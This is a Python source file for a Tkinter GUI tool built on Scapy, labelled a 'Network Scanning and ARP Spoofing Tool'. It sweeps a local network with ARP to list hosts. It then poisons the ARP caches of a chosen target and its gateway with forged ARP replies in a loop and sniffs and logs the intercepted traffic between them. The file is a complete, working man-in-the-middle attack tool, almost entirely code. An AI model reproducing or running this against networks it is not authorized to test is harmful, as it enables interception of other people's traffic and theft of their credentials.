import os
import socket
import psutil
from scapy.all import ARP, Ether, srp, send, conf, sniff
import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import platform
import sys
import traceback

# Adjust Scapy timeout and retry settings for large networks
conf.verb = 0  # Disable verbose output
SCAN_TIMEOUT = 2  # Increase timeout
SCAN_RETRIES = 3  # Number of retries

def handle_exceptions(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            args[0].log_message(f"Error: {e}\n{traceback.format_exc()}")
    return wrapper

class NetworkScanGUI:
    def __init__(self, master):
        self.master = master
        master.title("Network Scanning and ARP Spoofing Tool")
        self.create_widgets()
        self.scan_thread = None
        self.spoof_thread = None
        self.sniff_thread = None
        self.devices = []  # Store scanned devices
        self.spoofing = False
        self.set_network_interfaces()

    def create_widgets(self):
        self.create_scan_frame()
        self.create_devices_frame()
        self.create_spoof_frame()
        self.create_log_frame()

    def create_scan_frame(self):
        self.frame_scan = ttk.Frame(self.master)
        self.frame_scan.grid(row=0, column=0, padx=10, pady=5, sticky=tk.W)
        self.label_interface = ttk.Label(self.frame_scan, text="Network Interface:")
        self.label_interface.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.interfaces = ttk.Combobox(self.frame_scan)
        self.interfaces.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
        self.scan_button = ttk.Button(self.frame_scan, text="Scan Network", command=self.scan_network)
        self.scan_button.grid(row=0, column=2, padx=5, pady=5, sticky=tk.W)

    def create_devices_frame(self):
        self.frame_devices = ttk.Frame(self.master)
        self.frame_devices.grid(row=1, column=0, padx=10, pady=5, sticky=tk.W)
        self.devices_treeview = ttk.Treeview(self.frame_devices, columns=("IP Address", "MAC Address"))
        self.devices_treeview.heading("#0", text="Device")
        self.devices_treeview.heading("IP Address", text="IP Address")
        self.devices_treeview.heading("MAC Address", text="MAC Address")
        self.devices_treeview.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W+tk.E)

    def create_spoof_frame(self):
        self.frame_spoof = ttk.Frame(self.master)
        self.frame_spoof.grid(row=2, column=0, padx=10, pady=5, sticky=tk.W)
        self.label_target_ip = ttk.Label(self.frame_spoof, text="Target IP:")
        self.label_target_ip.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.target_ip_entry = ttk.Entry(self.frame_spoof)
        self.target_ip_entry.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
        self.label_gateway_ip = ttk.Label(self.frame_spoof, text="Gateway IP:")
        self.label_gateway_ip.grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        self.gateway_ip_entry = ttk.Entry(self.frame_spoof)
        self.gateway_ip_entry.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)
        self.spoof_button = ttk.Button(self.frame_spoof, text="Start ARP Spoofing", command=self.safe_start_arp_spoofing)
        self.spoof_button.grid(row=2, column=0, padx=5, pady=5, sticky=tk.W)
        self.stop_button = ttk.Button(self.frame_spoof, text="Stop ARP Spoofing", command=self.safe_stop_arp_spoofing)
        self.stop_button.grid(row=2, column=1, padx=5, pady=5, sticky=tk.W)

    def create_log_frame(self):
        self.frame_log = ttk.Frame(self.master)
        self.frame_log.grid(row=3, column=0, padx=10, pady=5, sticky=tk.W+tk.E)
        self.log_text = scrolledtext.ScrolledText(self.frame_log, wrap=tk.WORD, width=60, height=10, state='disabled')
        self.log_text.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W+tk.E)

    @handle_exceptions
    def set_network_interfaces(self):
        interfaces = self.get_network_interfaces()
        if interfaces:
            self.interfaces['values'] = list(interfaces)
            self.interfaces.set(list(interfaces)[0])

    @handle_exceptions
    def get_network_interfaces(self):
        if platform.system() == 'Windows':
            interfaces = psutil.net_if_addrs().keys()
        else:
            interfaces = psutil.net_if_addrs().keys()
        return interfaces

    @handle_exceptions
    def scan_network(self):
        selected_network = self.interfaces.get()
        self.scan_thread = threading.Thread(target=self.do_scan_network, args=(selected_network,))
        self.scan_thread.start()

    @handle_exceptions
    def do_scan_network(self, selected_network):
        ip_range = self.get_ip_range(selected_network)
        if not ip_range:
            self.insert_to_treeview("Unable to get IP range for the selected network interface.")
            return

        self.insert_to_treeview(f"Scanning network: {ip_range}...")

        # Use Scapy for scanning
        devices = self.scan_with_scapy(ip_range)
        unique_devices = {device['ip']: device for device in devices if device['ip'] and device['mac']}
        self.devices = list(unique_devices.values())  # Store scanned devices

        # Debug: print the devices list
        print("Scanned devices with Scapy:", self.devices)

        for device in self.devices:
            self.insert_to_treeview(device['ip'], device['mac'])

    @handle_exceptions
    def get_ip_range(self, interface):
        ip_address = self.get_ip_address(interface)
        netmask = self.get_netmask(interface)
        if ip_address and netmask:
            return self.ip_to_cidr(ip_address, netmask)
        return None

    @handle_exceptions
    def get_ip_address(self, ifname):
        addrs = psutil.net_if_addrs().get(ifname, [])
        for addr in addrs:
            if addr.family == socket.AF_INET:
                return addr.address
        return None

    @handle_exceptions
    def get_netmask(self, ifname):
        addrs = psutil.net_if_addrs().get(ifname, [])
        for addr in addrs:
            if addr.family == socket.AF_INET:
                return addr.netmask
        return None

    @handle_exceptions
    def ip_to_cidr(self, ip, netmask):
        ip_bits = "".join([bin(int(x))[2:].zfill(8) for x in ip.split(".")])
        netmask_bits = "".join([bin(int(x))[2:].zfill(8) for x in netmask.split(".")])
        cidr = sum([1 for bit in netmask_bits if bit == '1'])
        return f"{ip}/{cidr}"

    @handle_exceptions
    def scan_with_scapy(self, ip_range):
        results = []
        arp = ARP(pdst=ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=SCAN_TIMEOUT, retry=SCAN_RETRIES, verbose=False)[0]
        for sent, received in result:
            results.append({'ip': received.psrc, 'mac': received.hwsrc})
        return results

    @handle_exceptions
    def insert_to_treeview(self, ip, mac=None):
        if mac:
            self.devices_treeview.insert("", tk.END, text="Device", values=(ip, mac))
        else:
            self.devices_treeview.insert("", tk.END, text="Info", values=(ip, ""))

    def safe_start_arp_spoofing(self):
        self.safe_method(self.start_arp_spoofing)

    @handle_exceptions
    def start_arp_spoofing(self):
        target_ip = self.target_ip_entry.get()
        gateway_ip = self.gateway_ip_entry.get()
        if target_ip and gateway_ip:
            self.spoofing = True
            self.spoof_thread_stop_event = threading.Event()
            self.sniff_thread_stop_event = threading.Event()
            self.log_message(f"Starting ARP spoofing: Target IP={target_ip}, Gateway IP={gateway_ip}")
            self.spoof_thread = threading.Thread(target=self.arp_spoof, args=(target_ip, gateway_ip))
            self.spoof_thread.start()
            self.sniff_thread = threading.Thread(target=self.sniff_packets, args=(target_ip, gateway_ip))
            self.sniff_thread.start()
        else:
            self.log_message("Please provide both Target IP and Gateway IP.")

    def safe_stop_arp_spoofing(self):
        self.safe_method(self.stop_arp_spoofing)

    @handle_exceptions
    def stop_arp_spoofing(self):
        if self.spoofing:
            self.spoof_thread_stop_event.set()
            self.sniff_thread_stop_event.set()
            if self.spoof_thread.is_alive():
                self.spoof_thread.join()
            if self.sniff_thread.is_alive():
                self.sniff_thread.join()
            self.spoofing = False
            self.log_message("Stopped ARP spoofing.")
            target_ip = self.target_ip_entry.get()
            gateway_ip = self.gateway_ip_entry.get()
            target_mac = self.get_mac(target_ip)
            gateway_mac = self.get_mac(gateway_ip)
            self.restore_network(target_ip, gateway_ip, target_mac, gateway_mac)

    @handle_exceptions
    def arp_spoof(self, target_ip, gateway_ip):
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)
        if not target_mac or not gateway_mac:
            self.log_message("Could not find MAC addresses for the provided IPs.")
            return

        try:
            while not self.spoof_thread_stop_event.is_set():
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
                self.spoof_thread_stop_event.wait(2)
        except Exception as e:
            self.log_message(f"Error in ARP spoofing: {e}")

    @handle_exceptions
    def sniff_packets(self, target_ip, gateway_ip):
        filter_str = f"host {target_ip} or host {gateway_ip}"
        try:
            while not self.sniff_thread_stop_event.is_set():
                packets = sniff(filter=filter_str, timeout=10)
                for packet in packets:
                    self.log_packet(packet)
        except Exception as e:
            self.log_message(f"Error in sniffing packets: {e}")

    @handle_exceptions
    def log_packet(self, packet):
        self.log_message(f"Packet: {packet.summary()}")

    @handle_exceptions
    def get_mac(self, ip):
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
        else:
            self.log_message(f"No response for IP {ip}")
        return None

    @handle_exceptions
    def restore_network(self, target_ip, gateway_ip, target_mac, gateway_mac):
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3, verbose=False)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=3, verbose=False)
        self.log_message(f"Restored network: Target IP={target_ip}, Gateway IP={gateway_ip}")

    def log_message(self, message):
        self.log_text.configure(state='normal')
        self.log_text.insert(tk.END, message + '\n')
        self.log_text.configure(state='disabled')
        self.log_text.yview(tk.END)

    def safe_method(self, method):
        try:
            method()
        except Exception as e:
            self.log_message(f"Error: {e}\n{traceback.format_exc()}")

def main():
    try:
        root = tk.Tk()
        gui = NetworkScanGUI(root)
        root.protocol("WM_DELETE_WINDOW", lambda: on_close(root))
        root.mainloop()
    except Exception as e:
        print(f"GUI Error: {e}")

def on_close(root):
    root.destroy()
    sys.exit(0)

if __name__ == "__main__":
    main()
